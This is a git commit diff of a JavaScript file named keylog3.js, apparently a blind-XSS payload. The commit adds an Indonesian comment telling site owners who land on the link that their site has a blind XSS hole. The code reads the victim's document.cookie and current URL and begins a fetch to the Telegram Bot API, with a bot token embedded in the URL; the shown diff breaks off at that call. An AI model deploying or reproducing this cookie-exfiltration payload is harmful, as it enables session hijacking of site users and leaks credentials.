b85b6ba537877bfc963e79449a9f713c76a67d13
misquee <110459286+misquee@users.noreply.github.com>
2025-06-30 11:51:00 +0700

    hala mas" dari univ keylog3.js

--- keylog3.js
+++ keylog3.js
@@ -1,4 +1,6 @@
-let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
+// halooooo, kalau anda di arakhkan ke link berikut, berarti ada celah kemanan blind xss dalam web anda
+
+let cookies = document.cookie; 
 let currentURL = window.location.href;
 
 fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
